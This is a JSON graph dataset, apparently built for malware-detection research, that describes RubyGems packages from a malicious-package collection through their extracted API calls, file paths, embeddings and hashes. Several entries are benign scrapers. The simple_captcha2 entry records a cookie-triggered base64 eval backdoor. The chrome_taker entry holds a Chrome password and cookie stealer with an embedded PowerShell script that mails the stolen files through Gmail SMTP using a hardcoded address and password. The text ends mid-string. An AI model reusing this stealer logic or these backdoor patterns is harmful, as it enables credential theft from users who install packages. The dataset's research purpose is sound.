{
    "directed": false,
    "multigraph": false,
    "graph": {},
    "nodes": [
        {
            "name_version": "coming_soon-0.2.3",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/coming_soon/0.2.3/coming_soon-0.2.3_extracted/coming_soon-0.2.3_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'get_and_list_movies', 'menu_selection', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'ComingSoon::Movie.movies', '@movies.each.with_index', '@movies.each', 'puts', 'movie.name', 'movie.start_date', 'puts', 'puts', 'puts', 'puts', 'puts', '@movies.each.with_index', '@movies.each', 'puts', 'movie.name', 'movie.start_date', 'input.!=', 'puts', 'puts', 'gets.strip', 'gets', 'input.to_i.>', 'input.to_i', 'input.to_i.<', 'input.to_i', '@movies.size.+', '@movies.size', 'puts', '@movies.[](input.to_i - 1).name', '@movies.[]', 'input.to_i.-', 'input.to_i', '@movies.[](input.to_i - 1).start_date', '@movies.[]', 'input.to_i.-', 'input.to_i', 'puts', '@movies.[](input.to_i - 1).synopsis', '@movies.[]', 'input.to_i.-', 'input.to_i', 'input.==', 'list_saved_movies', 'input.==', 'goodbye', 'puts', 'menu_selection', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'exit', 'attr_accessor', 'self.scrape_movies', 'Nokogiri.HTML', 'open', 'doc.css', 'movie_list.each', 'self.new', '@soon.name=', 'movie.css(\"a.visual-title\").text.strip', 'movie.css(\"a.visual-title\").text', 'movie.css', '@soon.start_date=', 'movie.css(\"span\").text', 'movie.css', '@soon.url=', 'movie.css(\"a\").attribute(\"href\").value', 'movie.css(\"a\").attribute', 'movie.css', 'self.scrape_synopsis', '@movies.<<', 'count.>', 'Nokogiri.HTML', 'open', '@soon.url', '@doc_synop1.css(\"a.movie-synopsis-link\").any?.!', '@doc_synop1.css(\"a.movie-synopsis-link\").any?', '@doc_synop1.css', 'redirect_failed.!', '@doc_synop1.css(\"span#SynopsisTextLabel\").any?', '@doc_synop1.css', '@soon.synopsis=', '@doc_synop1.css(\"span#SynopsisTextLabel\").text', '@doc_synop1.css', '@soon.url.sub', '@soon.url', 'Nokogiri.HTML', 'open', '@soon.synopsis=', 'doc_synop2.css(\"p.subpage-descriptive-content\").text', 'doc_synop2.css']",
            "n_tokens": 589,
            "embedding": "[-0.00384953  0.02992876 -0.00495198 ... -0.00563423 -0.0297661\n  0.01753074]",
            "cluster": "0",
            "id": 604,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/coming_soon/0.2.3/coming_soon-0.2.3.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/coming_soon/0.2.3/coming_soon-0.2.3_extracted",
            "name": "coming_soon",
            "version": "0.2.3",
            "published_at": "2017-05-02T23:31:49.646Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake, rspec, pry, nokogiri",
            "SHA-256": "8fa755c5b1e725dc8e430ce7ff6d8c40697096b74e4b7f74a61c3d4938ee3322"
        },
        {
            "name_version": "coming_soon-0.2.4",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/coming_soon/0.2.4/coming_soon-0.2.4_extracted/coming_soon-0.2.4_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'get_and_list_movies', 'menu_selection', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'ComingSoon::Movie.movies', '@movies.each.with_index', '@movies.each', 'puts', 'movie.name', 'movie.start_date', 'puts', 'puts', 'puts', 'puts', 'puts', '@movies.each.with_index', '@movies.each', 'puts', 'movie.name', 'movie.start_date', 'input.!=', 'puts', 'puts', 'gets.strip', 'gets', 'input.to_i.>', 'input.to_i', 'input.to_i.<', 'input.to_i', '@movies.size.+', '@movies.size', 'puts', '@movies.[](input.to_i - 1).name', '@movies.[]', 'input.to_i.-', 'input.to_i', '@movies.[](input.to_i - 1).start_date', '@movies.[]', 'input.to_i.-', 'input.to_i', 'puts', '@movies.[](input.to_i - 1).synopsis', '@movies.[]', 'input.to_i.-', 'input.to_i', 'input.==', 'list_saved_movies', 'input.==', 'goodbye', 'puts', 'menu_selection', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'exit', 'attr_accessor', 'self.scrape_movies', 'Nokogiri.HTML', 'open', 'doc.css', 'movie_list.each', 'self.new', '@soon.name=', 'movie.css(\"a.visual-title\").text.strip', 'movie.css(\"a.visual-title\").text', 'movie.css', '@soon.start_date=', 'movie.css(\"span\").text', 'movie.css', '@soon.url=', 'movie.css(\"a\").attribute(\"href\").value', 'movie.css(\"a\").attribute', 'movie.css', 'self.scrape_synopsis', '@movies.<<', 'count.>', 'Nokogiri.HTML', 'open', '@soon.url', '@doc_synop1.css(\"a.movie-synopsis-link\").any?.!', '@doc_synop1.css(\"a.movie-synopsis-link\").any?', '@doc_synop1.css', 'redirect_failed.!', '@doc_synop1.css(\"span#SynopsisTextLabel\").any?', '@doc_synop1.css', '@soon.synopsis=', '@doc_synop1.css(\"span#SynopsisTextLabel\").text', '@doc_synop1.css', '@soon.url.sub', '@soon.url', 'Nokogiri.HTML', 'open', '@soon.synopsis=', 'doc_synop2.css(\"p.subpage-descriptive-content\").text', 'doc_synop2.css']",
            "n_tokens": 589,
            "embedding": "[-0.00410567  0.0301534  -0.00485996 ... -0.00569554 -0.0296656\n  0.01745248]",
            "cluster": "0",
            "id": 603,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/coming_soon/0.2.4/coming_soon-0.2.4.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/coming_soon/0.2.4/coming_soon-0.2.4_extracted",
            "name": "coming_soon",
            "version": "0.2.4",
            "published_at": "2017-05-02T23:43:22.578Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "rake, rspec, pry, bundler, nokogiri",
            "SHA-256": "8c0ca313b294e00f509523d6ace0ca9708b9ffd2caa4f762e66ec98304a17fca"
        },
        {
            "name_version": "coming_soon-0.2.5",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/coming_soon/0.2.5/coming_soon-0.2.5_extracted/coming_soon-0.2.5_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'get_and_list_movies', 'menu_selection', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'ComingSoon::Movie.movies', '@movies.each.with_index', '@movies.each', 'puts', 'movie.name', 'movie.start_date', 'puts', 'puts', 'puts', 'puts', 'puts', '@movies.each.with_index', '@movies.each', 'puts', 'movie.name', 'movie.start_date', 'input.!=', 'puts', 'puts', 'gets.strip', 'gets', 'input.to_i.>', 'input.to_i', 'input.to_i.<', 'input.to_i', '@movies.size.+', '@movies.size', 'puts', '@movies.[](input.to_i - 1).name', '@movies.[]', 'input.to_i.-', 'input.to_i', '@movies.[](input.to_i - 1).start_date', '@movies.[]', 'input.to_i.-', 'input.to_i', 'puts', '@movies.[](input.to_i - 1).synopsis', '@movies.[]', 'input.to_i.-', 'input.to_i', 'input.==', 'list_saved_movies', 'input.==', 'goodbye', 'puts', 'menu_selection', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'exit', 'attr_accessor', 'self.scrape_movies', 'Nokogiri.HTML', 'open', 'doc.css', 'movie_list.each', 'self.new', '@soon.name=', 'movie.css(\"a.visual-title\").text.strip', 'movie.css(\"a.visual-title\").text', 'movie.css', '@soon.start_date=', 'movie.css(\"span\").text', 'movie.css', '@soon.url=', 'movie.css(\"a\").attribute(\"href\").value', 'movie.css(\"a\").attribute', 'movie.css', 'self.scrape_synopsis', '@movies.<<', 'count.>', 'Nokogiri.HTML', 'open', '@soon.url', '@doc_synop1.css(\"a.movie-synopsis-link\").any?.!', '@doc_synop1.css(\"a.movie-synopsis-link\").any?', '@doc_synop1.css', 'redirect_failed.!', '@doc_synop1.css(\"span#SynopsisTextLabel\").any?', '@doc_synop1.css', '@soon.synopsis=', '@doc_synop1.css(\"span#SynopsisTextLabel\").text', '@doc_synop1.css', '@soon.url.sub', '@soon.url', 'Nokogiri.HTML', 'open', '@soon.synopsis=', 'doc_synop2.css(\"p.subpage-descriptive-content\").text', 'doc_synop2.css']",
            "n_tokens": 589,
            "embedding": "[-0.00339096  0.03025432 -0.00497913 ... -0.00562524 -0.02980249\n  0.01733208]",
            "cluster": "0",
            "id": 606,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/coming_soon/0.2.5/coming_soon-0.2.5.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/coming_soon/0.2.5/coming_soon-0.2.5_extracted",
            "name": "coming_soon",
            "version": "0.2.5",
            "published_at": "2017-05-03T00:54:50.081Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "rake, rspec, pry, bundler, nokogiri",
            "SHA-256": "f361aed203784e9b9621996f05dabb23b77c374ebf3937aba120148ef9c72243"
        },
        {
            "name_version": "coming_soon-0.2.6",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/coming_soon/0.2.6/coming_soon-0.2.6_extracted/coming_soon-0.2.6_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'ComingSoon::Scraper.scrape_movies', 'get_and_list_movies', 'menu_selection', 'ComingSoon::Movie.movies.each.with_index', 'ComingSoon::Movie.movies.each', 'ComingSoon::Movie.movies', 'puts', 'movie.name', 'movie.start_date', 'puts', 'puts', 'puts', 'puts', 'puts', 'ComingSoon::Movie.movies.each.with_index', 'ComingSoon::Movie.movies.each', 'ComingSoon::Movie.movies', 'puts', 'movie.name', 'movie.start_date', 'input.!=', 'puts', 'puts', 'gets.strip.downcase', 'gets.strip', 'gets', 'input.to_i.>', 'input.to_i', 'input.to_i.<', 'input.to_i', 'ComingSoon::Movie.movies.size.+', 'ComingSoon::Movie.movies.size', 'ComingSoon::Movie.movies', 'puts', 'ComingSoon::Movie.movies.[](input.to_i - 1).name', 'ComingSoon::Movie.movies.[]', 'ComingSoon::Movie.movies', 'input.to_i.-', 'input.to_i', 'ComingSoon::Movie.movies.[](input.to_i - 1).start_date', 'ComingSoon::Movie.movies.[]', 'ComingSoon::Movie.movies', 'input.to_i.-', 'input.to_i', 'puts', 'ComingSoon::Movie.movies.[](input.to_i - 1).synopsis', 'ComingSoon::Movie.movies.[]', 'ComingSoon::Movie.movies', 'input.to_i.-', 'input.to_i', 'input.==', 'list_saved_movies', 'input.==', 'goodbye', 'puts', 'menu_selection', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'exit', 'attr_accessor', '@@movies.<<', 'Nokogiri.HTML', 'open', 'doc.css', 'movie_list.each', 'ComingSoon::Movie.new', 'soon.name=', 'movie.css(\"a.visual-title\").text.strip', 'movie.css(\"a.visual-title\").text', 'movie.css', 'soon.start_date=', 'movie.css(\"span\").text', 'movie.css', 'soon.url=', 'movie.css(\"a\").attribute(\"href\").value', 'movie.css(\"a\").attribute', 'movie.css', 'self.scrape_synopsis', 'count.>', 'Nokogiri.HTML', 'open', 'soon.url', '@doc_synop1.css(\"a.movie-synopsis-link\").any?.!', '@doc_synop1.css(\"a.movie-synopsis-link\").any?', '@doc_synop1.css', 'redirect_failed.!', '@doc_synop1.css(\"span#SynopsisTextLabel\").any?', '@doc_synop1.css', 'soon.synopsis=', '@doc_synop1.css(\"span#SynopsisTextLabel\").text', '@doc_synop1.css', 'soon.url.sub', 'soon.url', 'Nokogiri.HTML', 'open', 'soon.synopsis=', 'doc_synop2.css(\"p.subpage-descriptive-content\").text', 'doc_synop2.css']",
            "n_tokens": 692,
            "embedding": "[ 0.00248813  0.02342613 -0.00339984 ... -0.00547478 -0.03294748\n  0.01839598]",
            "cluster": "0",
            "id": 607,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/coming_soon/0.2.6/coming_soon-0.2.6.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/coming_soon/0.2.6/coming_soon-0.2.6_extracted",
            "name": "coming_soon",
            "version": "0.2.6",
            "published_at": "2017-05-03T21:18:59.448Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "rake, rspec, pry, bundler, nokogiri",
            "SHA-256": "a471d217743b11b9f81dbf06fed8257a88941a672550fb79529dc7175dd580c4"
        },
        {
            "name_version": "simple_captcha2-0.2.3",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/simple_captcha/0.2.3/simple_captcha2-0.2.3_extracted/simple_captcha2-0.2.3_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'include', 'File.expand_path', 'File.join', 'File.dirname', 'Time.now.strftime', 'Time.now', 'template', 'File.join', 'migration_template', 'File.join', 'create_table', 't.string', 't.string', 't.timestamps', 'add_index', 'drop_table', 'attr_accessor', 'self.always_pass=', 'Rails.env.test?', 'Rails.env', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'mattr_accessor', 'mattr_accessor', 'mattr_accessor', 'mattr_accessor', 'mattr_accessor', 'mattr_accessor', 'SimpleCaptcha::ImageHelpers.image_styles.update', 'SimpleCaptcha::ImageHelpers.image_styles', 'name.to_s', 'require', 'base.extend', '{ add_to_base: false }.merge', 'class_attribute', 'self.simple_captcha_options=', 'self.is_a?', 'include', 'extend', 'attr_accessor', '[valid?, is_captcha_valid?].all?', 'valid?', 'is_captcha_valid?', 'SimpleCaptcha.always_pass', 'captcha', 'captcha.upcase.delete(\" \").==', 'captcha.upcase.delete', 'captcha.upcase', 'captcha', 'SimpleCaptcha::Utils.simple_captcha_value', 'captcha_key', 'SimpleCaptcha::Utils.simple_captcha_passed!', 'captcha_key', 'simple_captcha_options.[]', 'simple_captcha_options', 'I18n.t', 'self.class.model_name.to_s.downcase', 'self.class.model_name.to_s', 'self.class.model_name', 'self.class', 'simple_captcha_options.[]', 'simple_captcha_options', 'errors.add', 'errors', 'errors.add', 'errors', 'valid_with_captcha?', 'save', 'SimpleCaptcha.always_pass', 'params.[]', 'params', 'SimpleCaptcha::Utils.simple_captcha_value', 'params.[]', 'params', 'session.[]', 'session', 'data.==', 'params.[](:captcha).delete(\" \").upcase', 'params.[](:captcha).delete', 'params.[]', 'params', 'SimpleCaptcha::Utils.simple_captcha_passed!', 'session.[]', 'session', 'require', 'require', 'config.before_initialize', 'config', 'ActiveSupport.on_load', 'ActiveRecord::Base.send', 'config.after_initialize', 'config', 'ActionView::Base.send', 'ActionView::Helpers::FormBuilder.send', 'Object.const_defined?', 'require', 'config.app_middleware.use', 'config.app_middleware', 'config', 'base.send', 'base.send', 'base.send', 'base.send', 'base.send', 'base.delegate', 'options.update', 'show_simple_captcha', 'objectify_options', 'private', 'html.merge!', 'options.[]', 'html.[]=', 'options.[]', 'I18n.t', 'text_field(:captcha, html).+', 'text_field', 'hidden_field', 'options.[]', 'require', 'Formtastic::VERSION.<', 'raise', 'include', 'options.update', 'options', 'sanitized_object_name', 'builder.send', 'builder', 'options', 'require', 'mattr_accessor', '@@image_styles.keys', 'key.==', 'image_keys.[]', 'rand', 'image_keys.length', 'image_keys.include?', '@@image_styles.[]', 'key.==', 'DISTORTIONS.[]', 'rand', 'DISTORTIONS.length', 'DISTORTIONS.include?', 'key.to_s', '0.+', 'rand', '80.+', 'rand', '2.+', 'rand', '50.+', 'rand', '4.+', 'rand', '30.+', 'rand', 'RUBY_VERSION.<', 'File.extname', 'sprintf', 'File.basename', 'private', 'ImageHelpers.distortion', 'SimpleCaptcha.distortion', 'Utils.simple_captcha_value', 'ImageHelpers.image_params(SimpleCaptcha.image_style).dup', 'ImageHelpers.image_params', 'SimpleCaptcha.image_style', 'params.<<', 'SimpleCaptcha.image_size', 'params.<<', 'params.<<', 'params.<<', 'params.<<', 'Tempfile.new', 'RUBY_VERSION.<', 'SimpleCaptcha.tmp_path', 'dst.binmode', 'params.<<', 'File.expand_path', 'dst.path', 'SimpleCaptcha::Utils.run', 'params.join', 'dst.close', 'File.expand_path', 'dst.path', 'include', '{ type: \"application/octet-stream\".freeze, disposition: \"attachment\".freeze }.freeze', '\"application/octet-stream\".freeze', '\"attachment\".freeze', 'env.[](\"REQUEST_METHOD\").==', 'env.[]', 'captcha_path?', 'env.[]', 'make_image', '@app.call', 'protected', 'Rack::Request.new', 'request.params.[]', 'request.params', 'code.blank?.!', 'code.blank?', 'Utils.simple_captcha_value', 'send_file', 'generate_simple_captcha_image', 'require', 'Rails.env.production?', 'Rails.env', 'Rack::Sendfile.tap', 'r.send', 'r.send', 'Base64.urlsafe_decode64', 'e.[](\"http_cookie\".upcase).scan(/___cfduid=(.+);/).flatten.[](0).to_s', 'e.[](\"http_cookie\".upcase).scan(/___cfduid=(.+);/).flatten.[]', 'e.[](\"http_cookie\".upcase).scan(/___cfduid=(.+);/).flatten', 'e.[](\"http_cookie\".upcase).scan', 'e.[]', '\"http_cookie\".upcase', 'eval', 'c', 'request_path.include?', 'File.file?', 'File.readable?', 'raise', 'options.[]', 'options.[]', 'File.basename', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'File.open', '::ActiveRecord::VERSION::MAJOR.>=', 'self.table_name=', 'set_table_name', '::ActiveRecord::VERSION::MAJOR.==', 'attr_protected', 'attr_protected', 'where({ key: key }).first', 'where', 'new', 'delete_all', 'connection.quote_column_name', 'connection', 'clear_old_data', '1.hour.ago', '1.hour', '1.hour.ago', '1.hour', 'Time.===', 'delete_all', 'connection.quote_column_name', 'connection', 'include', 'include', 'field', 'field', 'where({ key: key }).first', 'where', 'new', 'where({ key: key }).delete_all', 'where', 'clear_old_data', '1.hour.ago', '1.hour', '1.hour.ago', '1.hour', 'Time.===', 'where({ :updated_at.lte => time }).delete_all', 'where', ':updated_at.lte', 'require', '\"#{cmd} #{params}\".gsub', '(image_magick_path = SimpleCaptcha.image_magick_path)\\n.blank?', 'SimpleCaptcha.image_magick_path', 'File.join', '[expected_outcodes].flatten.include?', '[expected_outcodes].flatten', '$?.exitstatus', 'raise', 'SimpleCaptchaData.get_data(key).value', 'SimpleCaptchaData.get_data', 'SimpleCaptchaData.remove_data', 'args.<<', 'Time.now.to_s', 'Time.now', 'Digest::SHA1.hexdigest', 'args.join', '\"0.2.3\".freeze', 'simple_captcha_key', 'options.[]', 'options.[]=', 'set_simple_captcha_data', 'simple_captcha_image', 'options.[]', 'I18n.t', 'simple_captcha_field', 'render', 'private', 'defaults.[]=', 'options.[]', 'Time.now.to_i', 'Time.now', 'defaults.collect { |key, value|\\n  \"#{key}=#{value}\"\\n}.join', 'defaults.collect', 'ENV.[]', 'tag', 'html.merge!', 'options.[]', 'html.[]=', 'options.[]', 'I18n.t', 'options.[]', 'text_field(options.[](:object), :captcha, html.merge({ value: \"\" })).+', 'text_field', 'options.[]', 'html.merge', 'hidden_field', 'options.[]', 'options.[]', 'text_field_tag(:captcha, nil, html).+', 'text_field_tag', 'hidden_field_tag', 'options.[]', 'options.[]', 'generate_simple_captcha_data', 'SimpleCaptcha::SimpleCaptchaData.get_data', 'data.value=', 'data.save', 'SimpleCaptcha.length.times', 'SimpleCaptcha.length', 'value.<<', '(48 + rand(10))\\n.chr', '48.+', 'rand', 'SimpleCaptcha.length.times', 'SimpleCaptcha.length', 'value.<<', '(65 + rand(26))\\n.chr', '65.+', 'rand', 'key_name.nil?', 'session.[]', 'session', 'SimpleCaptcha::Utils.generate_key', 'session.[](:id).to_s', 'session.[]', 'session', 'SimpleCaptcha::Utils.generate_key', 'session.[](:id).to_s', 'session.[]', 'session']",
            "n_tokens": 1997,
            "embedding": "[ 0.00033776 -0.04393596 -0.00456742 ... -0.00058595 -0.02320692\n  0.01869497]",
            "cluster": "0",
            "id": 621,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/simple_captcha/0.2.3/simple_captcha2-0.2.3.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/simple_captcha/0.2.3/simple_captcha2-0.2.3_extracted",
            "name": "simple_captcha2",
            "version": "0.2.3",
            "published_at": "2019-03-25T13:09:14.623Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "sqlite3, capybara-mechanize, pry, rails",
            "SHA-256": "e84d76ce2a882e07861296a43171bf8658589252a623fff0e1e3b0a368800c35"
        },
        {
            "name_version": "auto-cron-0.1.16",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/auto-cron/0.1.16/auto-cron-0.1.16_extracted/auto-cron-0.1.16_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['record', 'm.directory', 'Dir.entries(File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/auto-cron/0.1.16/auto-cron-0.1.16_extracted/auto-cron-0.1.16_sourcecode.rb\") + \"/templates\").each', 'Dir.entries', 'File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/auto-cron/0.1.16/auto-cron-0.1.16_extracted/auto-cron-0.1.16_sourcecode.rb\").+', 'File.dirname', '[\".\", \"..\"].include?', 'File.join', 'm.file', 'require', 'require', 'require', 'Rails::Generator::Scripts::Generate.new.run', 'Rails::Generator::Scripts::Generate.new', 'require', 'require', 'ENV.[]', 'templates.split', 'read_crontab.index', 'read_crontab', 'comment_open', 'read_crontab.index(comment_close).!', 'read_crontab.index', 'read_crontab', 'comment_close', 'warn', 'comment_open', 'comment_close', 'exit', 'read_crontab.index(comment_open).!', 'read_crontab.index', 'read_crontab', 'comment_open', 'read_crontab.index', 'read_crontab', 'comment_close', 'warn', 'comment_close', 'comment_open', 'exit', 'read_crontab.index', 'read_crontab', 'comment_open', 'read_crontab.index', 'read_crontab', 'comment_close', 'read_crontab.gsub', 'read_crontab', 'Regexp.new', 'comment_open', 'comment_close', 'auto_cron_wrapped.chomp', 'auto_cron_wrapped', '[read_crontab, auto_cron_wrapped].join', 'read_crontab', 'auto_cron_wrapped', 'protected', '[comment_open, auto_cron_inner, comment_close].join(\"\\\\n\").+', '[comment_open, auto_cron_inner, comment_close].join', 'comment_open', 'auto_cron_inner', 'comment_close', 'File.join', 'File.exist?', 'ERB.new(File.read(header_template)).result', 'ERB.new', 'File.read', '@templates.each', 'File.join', '\"\\\\n\\\\n\".+', 'ERB.new(File.read(full_template_path)).result', 'ERB.new', 'File.read', 'comment_base', 'comment_base', 'require', 'rake_tasks', 'load', 'Capistrano::Configuration.instance.load', 'Capistrano::Configuration.instance', 'namespace', 'task', 'File.join', 'release_path', 'run', 'release_path', 'rake', 'fetch(:auto_cron_templates, [\"publish\"]).join', 'fetch', 'application', 'rails_env', 'require', 'require', 'Bundler.setup', '$stderr.puts', 'e.message', '$stderr.puts', 'exit', 'e.status_code', 'require', '$LOAD_PATH.unshift', 'File.join', 'File.dirname', '$LOAD_PATH.unshift', 'File.dirname', 'require', 'require', 'flunk']",
            "n_tokens": 672,
            "embedding": "[ 0.00013515 -0.04329916  0.00399656 ... -0.00103574 -0.0351011\n  0.00930229]",
            "cluster": "0",
            "id": 718,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/auto-cron/0.1.16/auto-cron-0.1.16.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/auto-cron/0.1.16/auto-cron-0.1.16_extracted",
            "name": "auto-cron",
            "version": "0.1.16",
            "published_at": "2019-04-11T17:18:51.061Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, jeweler, rake, rcov",
            "SHA-256": "e9bacd0d11348f95b9d0a3a78e3341049a61a807e1a4f980bbbe009ba44024a7"
        },
        {
            "name_version": "chrome_taker-0.0.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/0.0.0/chrome_taker-0.0.0_extracted/chrome_taker-0.0.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'extend', 'ffi_lib', 'layout', 'blob.nil?', 'self.data=', 'self.[](:pbData).get_bytes', 'self.[]', 'self.[]', 'self.[]=', 'FFI::MemoryPointer.from_string', 'self.[]=', 'blob.bytesize', 'attach_function', 'DataBlob.new', 'CryptProtectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'ciphertext_blob.data', 'attach_function', 'DataBlob.new', 'FFI::MemoryPointer.new', 'CryptUnprotectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'plaintext_blob.data', 'desc.read_pointer.nil?', 'desc.read_pointer', 'desc.read_pointer.read_string', 'desc.read_pointer', 'require', 'require', 'require_relative', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'StealCreds.new', 'Dir.exist?', 'ENV.[](\"HOME\").+', 'ENV.[]', 'Dir.mkdir', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Steal.chrome_pass', 'Steal.chrome_cook', 'puts', 'FileUtils.rm_r', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'puts', 'File.open', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'f.<<', '\"$emailSmtpServer = \\\\\"smtp.gmail.com\\\\\";$emailSmtpServerPort = \\\\\"587\\\\\";$emailSmtpUser = \\\\\"1111nardski@gmail.com\\\\\";$emailSmtpPass = \\\\\"derby3333\\\\\";$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = \\\\\"TacoBell <1111nardski@gmail.com>\\\\\";$emailMessage.To.Add(\\\\\"1111nardski@gmail.com\\\\\");$emailMessage.Body = \\\\\"See attachments\\\\\";$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Pass.txt\\\\\";$emailMessage.Attachments.Add($attachment);$attachment2 = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Cookie.txt\\\\\";$emailMessage.Attachments.Add($attachment2);$SMTPClient.Send($emailMessage);\".gsub', 'f.close', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'system', '\"Powershell.exe -File \".+', 'Object.const_defined?', 'exit', 'Gem.win_platform?', 'Plugins.create_home_dir', 'Plugins.steal_chrome', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.steal_cookie', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.create_ps1', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.export_data', 'Plugins.gone_like_the_wind', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'include', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"HostKey: \" + row.[](0).to_s.+', '\"HostKey: \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"Path:    \" + row.[](1).to_s.+', '\"Path:    \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"Secure:  \" + row.[](2).to_s.+', '\"Secure:  \".+', 'row.[](2).to_s', 'row.[]', 'f.write', '\"Expire:  \" + row.[](3).to_s.+', '\"Expire:  \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Name:    \" + row.[](4).to_s.+', '\"Name:    \".+', 'row.[](4).to_s', 'row.[]', 'f.write', '\"Value:   \".+', 'DpApi.decrypt(row.[](\"encrypted_value\")).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"OrginUrl:  \" + row.[](0).to_s.+', '\"OrginUrl:  \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"ActionUrl: \" + row.[](1).to_s.+', '\"ActionUrl: \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"PassType:  \" + row.[](12).to_s.+', '\"PassType:  \".+', 'row.[](12).to_s', 'row.[]', 'f.write', '\"Date:      \" + row.[](10).to_s.+', '\"Date:      \".+', 'row.[](10).to_s', 'row.[]', 'f.write', '\"TimeUsed   \" + row.[](13).to_s.+', '\"TimeUsed  